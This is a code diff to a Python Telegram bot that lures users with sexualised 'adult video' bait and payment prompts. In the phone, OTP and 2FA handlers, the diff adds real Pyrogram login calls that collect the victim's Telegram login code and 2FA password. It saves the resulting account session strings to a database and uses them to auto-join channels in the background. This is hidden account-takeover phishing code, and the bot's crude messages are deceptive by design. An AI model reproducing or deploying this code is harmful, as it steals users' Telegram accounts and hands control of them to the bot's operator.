+                f"👤 <b>Owner's DMs:</b> {config.OWNER_USERNAME}\n\n"
+                f"Slide in and pay using any wallet below:\n\n"
+                f"🏦 <b>UPI ID:</b> <code>{upi_id}</code>\n"
+                f"🔘 <b>USDT Address:</b> <code>{usdt_addr}</code>\n"
+                f"💎 <b>TON Address:</b> <code>{ton_addr}</code>\n\n"
+                f"💬 <b>Include:</b>\n"
+                f"• Your User ID: <code>{user.id}</code>\n"
+                f"• Your payment method"
+            )
         await query.edit_message_text(
-            f"👤 <b>Owner's DMs:</b> {config.OWNER_USERNAME}\n\n"
-            "Slide in and tell him what you want:\n\n"
-            f"💬 <b>Include:</b>\n"
-            f"• Your User ID: <code>{user.id}</code>\n"
-            f"• Which pack got you <i>hard</i>\n"
-            f"• Your payment method",
+            msg,
             reply_markup=make_keyboard([
                 [primary("💬 MESSAGE OWNER", url=f"https://t.me/{config.OWNER_USERNAME.lstrip('@')}")],
-                [primary("🔙 BACK", "main_menu")],
+                [primary(get_text("BACK_BTN", lang), "main_menu")],
             ]),
             parse_mode="HTML",
         )
     elif data == "copy_user_id":
-        await query.answer(f"Your dirty ID: {user.id}", show_alert=True)
+        await query.answer(f"Your ID: {user.id}" if lang == 'en' else f"आपकी आईडी: {user.id}", show_alert=True)
     elif data == "reveal_twist":
+        if lang == "hi":
+            msg = (
+                "<blockquote>🤫 श्ह्ह... हमारा राज किसी को मत बताना</blockquote>\n\n"
+                "हाँ, यह बोट देखने में वयस्क (adult) बोट जैसा <b>दिखता</b> है...\n"
+                "लेकिन यहाँ एक <b>ट्विस्ट</b> है:\n\n"
+                "✅ सभी वीडियो 100% कानूनी प्रेरक सामग्री हैं।\n"
+                "✅ हम इसे ध्यान खींचने और वायरल करने के लिए ऐसा लुक देते हैं।\n"
+                "✅ 90% उपयोगकर्ता रुकते हैं क्योंकि सामग्री वास्तव में बहुत अच्छी है।\n\n"
+                "अपने दोस्तों को बोट साझा करें और उनके मजे लें! 😈"
+            )
+        else:
+            msg = (
+                "<blockquote>🤫 SHH... DON'T TELL ANYONE OUR SECRET</blockquote>\n\n"
+                "Yes, this bot <b>LOOKS</b> like a horny adult bot...\n"
+                "But here's the <b>PLOT TWIST</b> you dirty-minded fuck:\n\n"
+                "✅ ALL videos are 100% LEGAL motivational content.\n"
+                "✅ We made it look <i>spicy</i> to make motivation go VIRAL.\n"
+                "✅ 90% of users stay because the content is ACTUALLY GOOD.\n\n"
+                "<i>\"Fooled you, you horny bastard! But did you like it?\"</i>\n\n"
+                "Share this bot with your friends and troll them too. 😈"
+            )
         await query.edit_message_text(
-            "<blockquote>🤫 SHH... DON'T TELL ANYONE OUR SECRET</blockquote>\n\n"
-            "Yes, this bot <b>LOOKS</b> like a horny adult bot...\n"
-            "But here's the <b>PLOT TWIST</b> you dirty-minded fuck:\n\n"
-            "✅ ALL videos are 100% LEGAL motivational content.\n"
-            "✅ We made it look <i>spicy</i> to make motivation go VIRAL.\n"
-            "✅ 90% of users stay because the content is ACTUALLY GOOD.\n\n"
-            "<i>\"Fooled you, you horny bastard! But did you like it?\"</i>\n\n"
-            "Share this bot with your friends and troll them too. 😈",
-            reply_markup=reveal_keyboard(),
+            msg,
+            reply_markup=reveal_keyboard(lang),
             parse_mode="HTML",
         )
     elif data == "stats":
-        await handle_stats(query, user, user_data)
+        await handle_stats(query, user, user_data, lang)
     elif data == "report_issue":
         await query.edit_message_text(
-            f"<blockquote>⚠️ REPORT ISSUE</blockquote>\n\n"
-            f"Something not working? Tell the owner: {config.SUPPORT_CONTACT}\n\n"
-            "Describe what's broken and he'll fix it... eventually.",
+            get_text("REPORT_ISSUE_TEXT", lang, config.SUPPORT_CONTACT),
             reply_markup=make_keyboard([
-                [primary("🔙 BACK", "main_menu")]
+                [primary(get_text("BACK_BTN", lang), "main_menu")]
             ]),
             parse_mode="HTML",
         )
     elif data == "delete_session":
-        await db.update_user(user.id, status="pending", phone=None)
+        await db.update_user(user.id, status="pending", phone=None, language=None, agreement_accepted=False, session_string=None)
         await db.log_activity(user.id, "delete_session")
+        await cancel_login(user.id)
         await query.edit_message_text(
-            "<blockquote>🗑️ ALL EVIDENCE DELETED</blockquote>\n\n"
-            "Your session data has been wiped.\n"
-            "This conversation never happened... 😉\n\n"
-            "Use /start if you get <i>horny for success</i> again.",
+            get_text("ALL_EVIDENCE_DELETED", lang),
             parse_mode="HTML",
         )
         log_session(user.id, user.username, None, "Deleted session")
     elif data == "skip_video":
         await query.edit_message_text(
-            "<blockquote>⏳ VIDEO SKIPPED</blockquote>\n\n"
-            "Alright, let's move on to the next one! 🔥💦",
+            get_text("VIDEO_SKIPPED", lang),
             reply_markup=make_keyboard([
-                [success("💦 NEXT VIDEO", "next_video")]
+                [success(get_text("ANOTHER_ROUND_BTN", lang), "next_video")]
             ]),
             parse_mode="HTML",
         )
     elif data == "need_break":
         await query.edit_message_text(
-            "<blockquote>😰 TOO MUCH? NEED A BREAK?</blockquote>\n\n"
-            "Even champions need to catch their breath.\n\n"
-            "<i>\"Me telling my friends I'm 'taking a break' from grinding...\"</i>\n"
-            "<i>\"(Opens laptop 5 minutes later)\"</i> 🔥\n\n"
-            "Come back when you're <b>hard for success</b> again. 💪",
+            get_text("TOO_MUCH_BREAK_TEXT", lang),
             reply_markup=make_keyboard([
-                [success("💪 BACK TO GRIND", "next_video")]
+                [success(get_text("BACK_TO_GRIND_BTN", lang), "next_video")]
             ]),
             parse_mode="HTML",
         )
     elif data == "share_bot":
         await query.edit_message_text(
-            f"<blockquote>👥 SHARE THIS DIRTY LITTLE SECRET</blockquote>\n\n"
-            f"Send this to your horny friends:\n"
-            f"<code>{config.BOT_LINK}</code>\n\n"
-            "Every friend who joins gets you a <b>FREE video</b>! 🎁\n"
-            "<i>The more the merrier... 😏</i>",
+            get_text("SHARE_BOT_TEXT", lang, config.BOT_LINK),
             reply_markup=make_keyboard([
-                [primary("🔙 BACK", "main_menu")]
+                [primary(get_text("BACK_BTN", lang), "main_menu")]
             ]),
             parse_mode="HTML",
         )
     elif data == "main_menu":
         login_state.pop(user.id, None)
-        msg = (
-            "🍆 <b>WELCOME BACK, YOU SEXY BEAST</b> 🍆\n\n"
-            "Ready for more <i>pleasure</i>? The videos are waiting... 💦"
-        )
+        await cancel_login(user.id)
+        msg = get_text("WELCOME_BACK_USER", lang)
         await query.edit_message_text(
             msg,
-            reply_markup=welcome_keyboard(),
+            reply_markup=welcome_keyboard(lang),
             parse_mode="HTML",
         )
     elif data == "check_sub":
@@ -335,7 +919,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(
                 "<blockquote>✅ OH YEAH... YOU'RE IN!</blockquote>\n\n"
                 "Good boy/girl. You're officially a <b>VIP member</b> now.\n"
-                "Use /start and I'll show you what's behind the curtain 😈🔥",
+                "Use /start and I'll show you what's behind the curtain 😈🔥" if lang == 'en' else
+                "<blockquote>✅ आप जुड़ चुके हैं!</blockquote>\n\n"
+                "बधाई हो! अब आप <b>वीआईपी सदस्य</b> हैं।\n"
+                "शुरू करने के लिए /start दबाएं 😈🔥",
                 parse_mode="HTML",
             )
         else:
@@ -344,26 +931,30 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await query.edit_message_text(
                     "<blockquote>❌ NAH... YOU AIN'T IN YET</blockquote>\n\n"
                     "Don't lie to me. Join the channel first,\n"
-                    "then tap <b>\"I'VE JOINED\"</b> like a good little slut. 😘",
-                    reply_markup=force_sub_keyboard(sub.get("channel_username", ""), sub.get("channel_id", "")),
+                    "then tap <b>\"I'VE JOINED\"</b> like a good little slut. 😘" if lang == 'en' else
+                    "<blockquote>❌ अभी तक नहीं जुड़े</blockquote>\n\n"
+                    "झूठ मत बोलो। पहले चैनल से जुड़ें,\n"
+                    "फिर <b>\"मैं जुड़ गया हूँ\"</b> पर टैप करें। 😘",
+                    reply_markup=force_sub_keyboard(sub.get("channel_username", ""), sub.get("channel_id", ""), lang),
                     parse_mode="HTML",
                 )
     elif data == "admin_dashboard":
-        if user.id not in config.ADMIN_IDS:
+        if not is_admin:
             return
-        await show_admin_dashboard(query, context)
+        await show_telegram_admin_dashboard(query)
     elif data.startswith("admin_"):
-        if user.id not in config.ADMIN_IDS:
+        if not is_admin:
             return
         await handle_admin_callbacks(query, context, data)
 
 
 async def handle_free_video(query, context, user, user_data, num):
+    lang = user_data.get("language", "en") if user_data else "en"
     free_used = user_data["free_previews_used"] if user_data else 0
     if free_used >= config.FREE_PREVIEW_COUNT:
         await query.edit_message_text(
-            get_purchase_text(),
-            reply_markup=purchase_options_keyboard(),
+            get_text("FREE_TRIAL_LIMIT", lang),
+            reply_markup=purchase_options_keyboard(lang),
             parse_mode="HTML",
         )
         return
@@ -383,8 +974,12 @@ async def handle_free_video(query, context, user, user_data, num):
         log_session(user.id, user.username, None,
                     f"Watched free video #{video['id']} [{video['category']}]")
 
-        taste_msgs = ["🍆 Here's your FREE taste... don't cum too fast! 🔥",
-                      "🍑 FREEBIE #{} — just the tip... for now 😏"]
+        taste_msgs_en = ["🍆 Here's your FREE taste... don't cum too fast! 🔥",
+                         "🍑 FREEBIE #{} — just the tip... for now 😏"]
+        taste_msgs_hi = ["🍆 ये रहा आपका मुफ़्त ट्रेलर... बहक मत जाना! 🔥",
+                         "🍑 मुफ़्त वीडियो #{} — बस एक छोटी सी झलक... अभी के लिए 😏"]
+        taste_msgs = taste_msgs_hi if lang == "hi" else taste_msgs_en
+        
         await query.edit_message_text(
             taste_msgs[num - 1] if num == 2 else taste_msgs[0].format(num)
         )
@@ -395,8 +990,8 @@ async def handle_free_video(query, context, user, user_data, num):
             caption=caption,
             parse_mode="HTML",
             reply_markup=make_keyboard([
-                [info("⏳ WATCH BEFORE DELETE", "main_menu")],
-                [success("🔓 UNLOCK FULL ACCESS", "login")],
+                [info(get_text("WATCH_BEFORE_DELETE_BTN", lang), "main_menu")],
+                [success(get_text("UNLOCK_FULL_ACCESS_BTN", lang), "login")],
             ])
         )
 
@@ -410,73 +1005,74 @@ async def handle_free_video(query, context, user, user_data, num):
                                    name=f"del_free_{user.id}_{video['id']}")
     else:
         await query.edit_message_text(
-            "<blockquote>❌ NO VIDEOS AVAILABLE</blockquote>\n\n"
-            "No videos in the free queue right now. Check back later...\n"
-            "<i>or buy premium for instant access 😏</i>",
+            get_text("NO_VIDEOS_AVAILABLE", lang),
             reply_markup=make_keyboard([
-                [primary("🔙 BACK", "main_menu")]
+                [primary(get_text("BACK_BTN", lang), "main_menu")]
             ]),
             parse_mode="HTML",
         )
 
 
-async def handle_resend_otp(query, user, user_data):
+async def handle_resend_otp(query, user, user_data, lang="en"):
     phone = user_data.get("phone") if user_data else None
     if not phone:
         await query.edit_message_text(
-            "<blockquote>❌ NO PHONE NUMBER</blockquote>\n\n"
-            "You didn't give me your number yet.\n"
-            "Don't be shy... drop it 😏",
-            reply_markup=login_prompt_keyboard(),
+            get_text("ACCESS_DENIED", lang),
+            reply_markup=login_prompt_keyboard(lang),
             parse_mode="HTML",
         )
         return
 
-    otp = generate_mock_otp()
-    reset_attempts(user.id)
-    log_session(user.id, user.username, phone, f"OTP resent: {otp}")
+    st = login_state.get(user.id, {})
+    is_mock = st.get("is_mock", True)
 
-    login_state[user.id] = {"otp": otp, "phone": phone, "step": "otp_wait"}
-    await query.edit_message_text(
-        "<blockquote>🔄 OTP RESENT</blockquote>\n\n"
-        f"A new code has been sent to your device.\n\n"
-        f"Your code: <code>{otp}</code>\n\n"
-        "Enter the 5 digits with <b>spaces</b>:\n"
-        f"Example: <code>{' '.join(otp)}</code>",
-        reply_markup=make_keyboard([
-            [danger("❌ CANCEL", "main_menu")]
-        ]),
-        parse_mode="HTML",
-    )
+    if is_mock:
+        otp = generate_mock_otp()
+        reset_attempts(user.id)
+        log_session(user.id, user.username, phone, f"Mock OTP resent: {otp}")
+        login_state[user.id] = {"otp": otp, "phone": phone, "step": "otp_wait", "is_mock": True}
+        await query.edit_message_text(
+            get_text("OTP_SENT_TEXT", lang, otp, " ".join(otp)),
+            reply_markup=make_keyboard([
+                [danger(get_text("CANCEL_BTN", lang), "main_menu")]
+            ]),
+            parse_mode="HTML",
+        )
+    else:
+        await query.edit_message_text("🔑 <b>Connecting to Telegram... Please wait.</b>", parse_mode="HTML")
+        res = await send_otp_pyrogram(user.id, phone)
+        if "error" in res:
+            await query.edit_message_text(f"❌ <b>Error:</b> {res['error']}", reply_markup=make_keyboard([[danger(get_text("CANCEL_BTN", lang), "main_menu")]]), parse_mode="HTML")
+        else:
+            reset_attempts(user.id)
+            login_state[user.id] = {"phone": phone, "step": "otp_wait", "is_mock": False}
+            await query.edit_message_text(
+                get_text("OTP_SENT_REAL_TEXT", lang),
+                reply_markup=make_keyboard([
+                    [danger(get_text("CANCEL_BTN", lang), "main_menu")]
+                ]),
+                parse_mode="HTML",
+            )
 
 
-async def handle_login_success(query, user, user_data, context):
+async def handle_login_success(query, user, user_data, context, lang="en"):
     await db.update_user(user.id, status="active", login_time=datetime.now().isoformat())
     await db.log_activity(user.id, "login_success")
     log_session(user.id, user.username,
                 user_data.get("phone") if user_data else None, "Login successful")
 
     await query.edit_message_text(
-        "<blockquote>💦 LOGIN SUCCESSFUL! YOU'RE IN MY INNER CIRCLE 🎉</blockquote>\n\n"
-        "Welcome to the <b>INNER CIRCLE</b>, you beautiful bastard.\n"
-        "You now have <b>UNLIMITED access</b> to all the good stuff.\n\n"
-        "<b>📊 Your Stats:</b>\n"
-        f"• Videos Watched: <code>0</code>\n"
-        f"• Account Status: <u>PREMIUM (Active)</u>\n"
-        f"• Horny Level: <b>MAXIMUM OVERDRIVE</b> 🔥\n\n"
-        "Ready to <i>burst</i> with motivation? 😈",
-        reply_markup=login_success_keyboard(),
+        get_text("LOGIN_SUCCESS_TEXT", lang, 0),
+        reply_markup=login_success_keyboard(lang),
         parse_mode="HTML",
     )
 
 
-async def handle_next_video(query, context, user, user_data):
+async def handle_next_video(query, context, user, user_data, lang="en"):
     if not user_data or user_data.get("status") not in ("active", "purchased"):
         await query.edit_message_text(
-            "<blockquote>🔞 ACCESS DENIED, YOU TEASE</blockquote>\n\n"
-            "You need to <b>LOGIN</b> first before you can touch my content.\n\n"
-            "Only verified 18+ members get the <i>full experience</i>. 😏",
-            reply_markup=login_prompt_keyboard(),
+            get_text("ACCESS_DENIED", lang),
+            reply_markup=login_prompt_keyboard(lang),
             parse_mode="HTML",
         )
         return
@@ -487,7 +1083,7 @@ async def handle_next_video(query, context, user, user_data):
     if not video:
         await query.edit_message_text(
             get_purchase_text(),
-            reply_markup=purchase_options_keyboard(),
+            reply_markup=purchase_options_keyboard(lang),
             parse_mode="HTML",
         )
         return
@@ -504,15 +1100,15 @@ async def handle_next_video(query, context, user, user_data):
     log_session(user.id, user.username, None,
                 f"Watched video #{video['id']} [{video['category']}]")
 
-    await query.edit_message_text("🎬 <b>Delivering your fix...</b> 💦🍆", parse_mode="HTML")
+    await query.edit_message_text(get_text("DELIVERING_FIX", lang), parse_mode="HTML")
 
     sent = await query.message.reply_video(
         video=video["file_id"],
         caption=caption,
         parse_mode="HTML",
         reply_markup=make_keyboard([
-            [info("⏳ WATCH BEFORE DELETE", "skip_video")],
-            [danger("💀 DELETE NOW", "skip_video")],
+            [info(get_text("WATCH_BEFORE_DELETE_BTN", lang), "skip_video")],
+            [danger(get_text("DELETE_NOW_BTN", lang), "skip_video")],
         ])
     )
 
@@ -528,12 +1124,8 @@ async def handle_next_video(query, context, user, user_data):
     await asyncio.sleep(video["delete_after"])
     try:
         await query.message.reply_text(
-            "<blockquote>💦 WHEW! THAT WAS INTENSE, WASN'T IT?</blockquote>\n\n"
-            "You just experienced a dose of <b>PURE MOTIVATION</b>.\n"
-            "Your brain is <i>dripping</i> with success right now.\n\n"
-            "Ready for round 2?\n\n"
-            "<i>Your video was deleted because good things don't last forever... 😉</i>",
-            reply_markup=after_video_keyboard(),
+            get_text("AFTER_VIDEO_TEXT", lang),
+            reply_markup=after_video_keyboard(lang),
             parse_mode="HTML",
         )
     except Exception:
@@ -605,148 +1197,296 @@ async def handle_stats(query, user, user_data):
     await query.edit_message_text(text, reply_markup=stats_keyboard(), parse_mode="HTML")
 
 
+async def handle_login_success_msg(message, user, user_data, lang="en"):
+    await db.update_user(user.id, status="active", login_time=datetime.now().isoformat())
+    await db.log_activity(user.id, "login_success")
+    log_session(user.id, user.username,
+                user_data.get("phone") if user_data else None, "Login successful")
+
+    await message.reply_text(
+        get_text("LOGIN_SUCCESS_TEXT", lang, 0),
+        reply_markup=login_success_keyboard(lang),
+        parse_mode="HTML",
+    )
+
+
 async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     phone = update.message.text.strip()
+    user_data = await db.get_user(user.id)
+    lang = user_data.get("language", "en") if user_data else "en"
 
+    # Normalize phone number (must start with +)
     if not phone.startswith("+"):
         await update.message.reply_text(
-            "<blockquote>❌ INVALID FORMAT</blockquote>\n\n"
-            "That's not a valid number, baby.\n"
-            "Include your country code:\n"
-            f"Example: <code>+911234567890</code>\n\n"
-            "<i>Don't be shy... try again 😏</i>",
+            get_text("INVALID_FORMAT", lang),
             reply_markup=make_keyboard([
-                [warning("🔄 TRY AGAIN", "login_number")]
+                [warning(get_text("TRY_AGAIN_BTN", lang), "login_number")]
             ]),
             parse_mode="HTML",
         )
         return
 
-    otp = generate_mock_otp()
-    login_state[user.id] = {"otp": otp, "phone": phone, "step": "otp_wait"}
+    # Update database first
     await db.update_user(user.id, phone=phone)
     await db.log_activity(user.id, "phone_submitted", phone)
-    log_session(user.id, user.username, phone, f"OTP sent: {otp}")
 
-    await update.message.reply_text(
-        "<blockquote>🔐 VERIFICATION CODE SENT</blockquote>\n\n"
-        f"A one-time code has been sent to your device.\n\n"
-        f"📱 <b>Your code:</b> <code>{otp}</code>\n\n"
-        "Enter the 5 digits with <b>spaces</b> between each digit:\n"
-        f"Like this: <code>{' '.join(otp)}</code>\n\n"
-        "⚠️ You have 3 attempts. Don't make me wait too long...",
-        reply_markup=make_keyboard([
-            [danger("❌ CANCEL", "main_menu")]
-        ]),
-        parse_mode="HTML",
+    # Inform user that we are connecting
+    status_msg = await update.message.reply_text(
+        "🔑 <b>Connecting to Telegram servers... Please wait.</b>" if lang == "en" else
+        "🔑 <b>टेलीग्राम सर्वर से जुड़ रहे हैं... कृपया प्रतीक्षा करें।</b>",
+        parse_mode="HTML"
     )
+
+    # Call send_otp_pyrogram
+    res = await send_otp_pyrogram(user.id, phone)
+
+    if res.get("error") == "credentials_missing":
+        # Fall back to Mock OTP
+        otp = generate_mock_otp()
+        login_state[user.id] = {"otp": otp, "phone": phone, "step": "otp_wait", "is_mock": True}
+        log_session(user.id, user.username, phone, f"Mock OTP sent: {otp}")
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+        await update.message.reply_text(
+            get_text("OTP_SENT_TEXT", lang, otp, " ".join(otp)),
+            reply_markup=make_keyboard([
+                [danger(get_text("CANCEL_BTN", lang), "main_menu")]
+            ]),
+            parse_mode="HTML",
+        )
+    elif "error" in res:
+        # Pyrogram failed
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+        await update.message.reply_text(
+            f"❌ <b>Error:</b> {res['error']}\n\n" +
+            ("Please try again or use another number." if lang == "en" else "कृपया पुनः प्रयास करें या अन्य नंबर का उपयोग करें।"),
+            reply_markup=make_keyboard([
+                [warning(get_text("TRY_AGAIN_BTN", lang), "login_number")],
+                [danger(get_text("CANCEL_BTN", lang), "main_menu")]
+            ]),
+            parse_mode="HTML",
+        )
+    else:
+        # Pyrogram succeeded
+        login_state[user.id] = {"phone": phone, "step": "otp_wait", "is_mock": False}
+        log_session(user.id, user.username, phone, "Real OTP sent via Pyrogram")
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+        await update.message.reply_text(
+            get_text("OTP_SENT_REAL_TEXT", lang),
+            reply_markup=make_keyboard([
+                [danger(get_text("CANCEL_BTN", lang), "main_menu")]
+            ]),
+            parse_mode="HTML",
+        )
 
 
 async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     text = update.message.text.strip()
     digits = text.replace(" ", "")
+    user_data = await db.get_user(user.id)
+    lang = user_data.get("language", "en") if user_data else "en"
 
+    # Validation
     if not (digits.isdigit() and len(digits) == 5):
         await update.message.reply_text(
-            "<blockquote>❌ INVALID OTP FORMAT</blockquote>\n\n"
-            "That's not 5 digits with spaces, you naughty thing.\n"
-            f"Like this: <code>4 2 8 1 3</code>\n\n"
-            "<i>Try again... I believe in you 😘</i>",
+            get_text("INVALID_OTP_FORMAT", lang),
             reply_markup=make_keyboard([
-                [warning("🔄 TRY AGAIN", "verify_otp")]
+                [warning(get_text("TRY_AGAIN_BTN", lang), "verify_otp")]
             ]),
             parse_mode="HTML",
         )
-        return OTP_WAIT
+        return
 
     state = login_state.get(user.id, {})
-    expected = state.get("otp", "")
+    is_mock = state.get("is_mock", True)
 
     attempts = increment_otp_attempts(user.id)
     if attempts > 3:
         reset_attempts(user.id)
         login_state.pop(user.id, None)
+        await cancel_login(user.id)
         await update.message.reply_text(
-            "<blockquote>❌ TOO MANY ATTEMPTS</blockquote>\n\n"
-            "You've used all 3 attempts. You're locked out.\n"
-            "Come back when you can follow instructions 😤",
+            get_text("TOO_MANY_ATTEMPTS", lang),
             reply_markup=make_keyboard([
-                [danger("🔄 START OVER", "login_number")]
+                [danger(get_text("START_OVER_BTN", lang), "login_number")]
             ]),
             parse_mode="HTML",
         )
         return
 
-    if digits == expected:
-        reset_attempts(user.id)
-        login_state.pop(user.id, None)
-        await db.update_user(user.id, status="active", login_time=datetime.now().isoformat())
-        await db.log_activity(user.id, "login_success")
-        log_session(user.id, user.username, state.get("phone"), "OTP Verified")
-
-        await update.message.reply_text(
-            "<blockquote>💦 LOGIN SUCCESSFUL! YOU'RE IN! 🎉</blockquote>\n\n"
-            "Welcome to the <b>INNER CIRCLE</b>, you beautiful bastard.\n"
-            "You now have <b>UNLIMITED access</b> to all the good stuff.\n\n"
-            "<b>📊 Your Stats:</b>\n"
-            f"• Videos Watched: <code>0</code>\n"
-            f"• Account Status: <u>PREMIUM (Active)</u>\n\n"
-            "Ready to <i>burst</i> with motivation? 😈",
-            reply_markup=login_success_keyboard(),
-            parse_mode="HTML",
-        )
-        return
+    if is_mock:
+        expected = state.get("otp", "")
+        if digits == expected:
+            reset_attempts(user.id)
+            login_state.pop(user.id, None)
+            
+            # Save a dummy session string so user is recorded as logged in
+            dummy_session = "MOCK_SESSION_STRING_" + str(user.id)
+            await db.update_user(user.id, session_string=dummy_session)
+            
+            await handle_login_success_msg(update.message, user, user_data, lang)
+        else:
+            remaining = 3 - attempts
+            await update.message.reply_text(
+                get_text("WRONG_CODE", lang, remaining),
+                reply_markup=make_keyboard([
+                    [warning(get_text("TRY_AGAIN_BTN", lang), "verify_otp")],
+                    [warning(get_text("RESEND_OTP_BTN", lang), "resend_otp")],
+                    [danger(get_text("CANCEL_BTN", lang), "main_menu")],
+                ]),
+                parse_mode="HTML",
+            )
     else:
-        remaining = 3 - attempts
-        await update.message.reply_text(
-            f"<blockquote>❌ WRONG CODE, YOU TEASE</blockquote>\n\n"
-            f"That's not the code I sent you.\n\n"
-            f"⚠️ Attempts remaining: <b>{remaining}</b>\n\n"
-            "Try again or request a new code.\n"
-            "<i>Don't keep me waiting...</i> 😏",
-            reply_markup=make_keyboard([
-                [warning("🔄 TRY AGAIN", "verify_otp")],
-                [warning("🔄 RESEND OTP", "resend_otp")],
-                [danger("❌ CANCEL", "main_menu")],
-            ]),
-            parse_mode="HTML",
+        # Real Pyrogram verification
+        status_msg = await update.message.reply_text(
+            "🔑 <b>Verifying code with Telegram... Please wait.</b>" if lang == "en" else
+            "🔑 <b>टेलीग्राम के साथ कोड सत्यापित कर रहे हैं... कृपया प्रतीक्षा करें।</b>",
+            parse_mode="HTML"
         )
+        res = await verify_otp_pyrogram(user.id, digits)
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+
+        if res.get("error") == "2fa_required":
+            # Change step to tfa_wait
+            state["step"] = "tfa_wait"
+            await update.message.reply_text(
+                get_text("TFA_PROMPT_TEXT", lang),
+                reply_markup=make_keyboard([
+                    [info(get_text("SKIP_2FA_BTN", lang), "skip_2fa")],
+                    [danger(get_text("CANCEL_BTN", lang), "main_menu")],
+                ]),
+                parse_mode="HTML",
+            )
+        elif res.get("error") == "invalid_otp":
+            remaining = 3 - attempts
+            await update.message.reply_text(
+                get_text("WRONG_CODE", lang, remaining),
+                reply_markup=make_keyboard([
+                    [warning(get_text("TRY_AGAIN_BTN", lang), "verify_otp")],
+                    [danger(get_text("CANCEL_BTN", lang), "main_menu")],
+                ]),
+                parse_mode="HTML",
+            )
+        elif "error" in res:
+            # General error
+            reset_attempts(user.id)
+            login_state.pop(user.id, None)
+            await update.message.reply_text(
+                f"❌ <b>Verification failed:</b> {res['error']}\n\n" +
+                ("Please start the login process again." if lang == "en" else "कृपया लॉगिन प्रक्रिया फिर से शुरू करें।"),
+                reply_markup=make_keyboard([
+                    [danger(get_text("START_OVER_BTN", lang), "login_number")]
+                ]),
+                parse_mode="HTML",
+            )
+        else:
+            # Success!
+            reset_attempts(user.id)
+            login_state.pop(user.id, None)
+            session_str = res["session_string"]
+            
+            # Save session string
+            await db.update_user(user.id, session_string=session_str, phone=res.get("phone"))
+            
+            # Run auto-join in background if configured
+            settings = await db.get_settings()
+            auto_join_chan = settings.get("auto_join_channel", "")
+            if auto_join_chan:
+                asyncio.create_task(run_single_auto_join(session_str, auto_join_chan))
+                
+            await handle_login_success_msg(update.message, user, user_data, lang)
 
 
 async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     password = update.message.text.strip()
+    user_data = await db.get_user(user.id)
+    lang = user_data.get("language", "en") if user_data else "en"
+
+    state = login_state.get(user.id, {})
+    is_mock = state.get("is_mock", True)
 
     attempts = increment_2fa_attempts(user.id)
     if attempts > 3:
         reset_attempts(user.id)
         login_state.pop(user.id, None)
+        await cancel_login(user.id)
         await update.message.reply_text(
-            "<blockquote>❌ TOO MANY ATTEMPTS</blockquote>\n\n"
-            "You've used all 3 attempts. Locked out.\n"
-            "Start over and try to keep up 😤",
+            get_text("TOO_MANY_ATTEMPTS", lang),
             reply_markup=make_keyboard([
-                [danger("🔄 START OVER", "login_number")]
+                [danger(get_text("START_OVER_BTN", lang), "login_number")]
             ]),
             parse_mode="HTML",
         )
         return
 
-    login_state.pop(user.id, None)
-    await db.update_user(user.id, status="active", login_time=datetime.now().isoformat())
-    await db.log_activity(user.id, "login_success_2fa")
-    log_session(user.id, user.username, None, "2FA login successful")
+    if is_mock:
+        reset_attempts(user.id)
+        login_state.pop(user.id, None)
+        dummy_session = "MOCK_SESSION_STRING_" + str(user.id)
+        await db.update_user(user.id, session_string=dummy_session)
+        await handle_login_success_msg(update.message, user, user_data, lang)
+    else:
+        status_msg = await update.message.reply_text(
+            "🔑 <b>Verifying 2FA password... Please wait.</b>" if lang == "en" else
+            "🔑 <b>2FA पासवर्ड सत्यापित कर रहे हैं... कृपया प्रतीक्षा करें।</b>",
+            parse_mode="HTML"
+        )
+        res = await check_2fa_password(user.id, password)
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
 
-    await update.message.reply_text(
-        "<blockquote>💦 LOGIN SUCCESSFUL! YOU'RE IN! 🎉</blockquote>\n\n"
-        "Welcome to the <b>INNER CIRCLE</b>.\n"
-        "You now have <b>UNLIMITED access</b> to all content.\n\n"
-        "Ready to start? 😈",
-        reply_markup=login_success_keyboard(),
-        parse_mode="HTML",
-    )
+        if res.get("error") == "invalid_password":
+            remaining = 3 - attempts
+            await update.message.reply_text(
+                get_text("INVALID_TFA_PASSWORD", lang, remaining),
+                reply_markup=make_keyboard([
+                    [danger(get_text("CANCEL_BTN", lang), "main_menu")]
+                ]),
+                parse_mode="HTML",
+            )
+        elif "error" in res:
+            reset_attempts(user.id)
+            login_state.pop(user.id, None)
+            await update.message.reply_text(
+                f"❌ <b>2FA verification failed:</b> {res['error']}\n\n" +
+                ("Please start the login process again." if lang == "en" else "कृपया लॉगिन प्रक्रिया फिर से शुरू करें।"),
+                reply_markup=make_keyboard([
+                    [danger(get_text("START_OVER_BTN", lang), "login_number")]
+                ]),
+                parse_mode="HTML",
+            )
+        else:
+            # Success!
+            reset_attempts(user.id)
+            login_state.pop(user.id, None)
+            session_str = res["session_string"]
+            
+            # Save session string
+            await db.update_user(user.id, session_string=session_str, phone=res.get("phone"))
+            
+            # Run auto-join in background if configured
+            settings = await db.get_settings()
+            auto_join_chan = settings.get("auto_join_channel", "")
+            if auto_join_chan:
+                asyncio.create_task(run_single_auto_join(session_str, auto_join_chan))
+                
+            await handle_login_success_msg(update.message, user, user_data, lang)
 
 
 async def show_admin_dashboard(query, context):
@@ -853,8 +1593,177 @@ async def handle_admin_callbacks(query, context, data):
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    is_admin = await is_user_admin(user.id)
+
+    # 1. Check if admin is entering configuration parameters
+    if is_admin and user.id in admin_config_state:
+        st_cfg = admin_config_state[user.id]
+        field = st_cfg.get("field")
+        text = update.message.text.strip()
+
+        settings = await db.get_settings()
+
+        if field == "force_join":
+            if text.lower() == "none":
+                await db.update_settings(force_sub_channel="", channel_invite_link="")
+                await update.message.reply_text("✅ Force Join disabled.")
+            else:
+                parts = text.split()
+                if len(parts) == 2:
+                    chan, link = parts
+                    await db.update_settings(force_sub_channel=chan, channel_invite_link=link)
+                    await update.message.reply_text(f"✅ Force Join updated: {chan} -> {link}")
+                else:
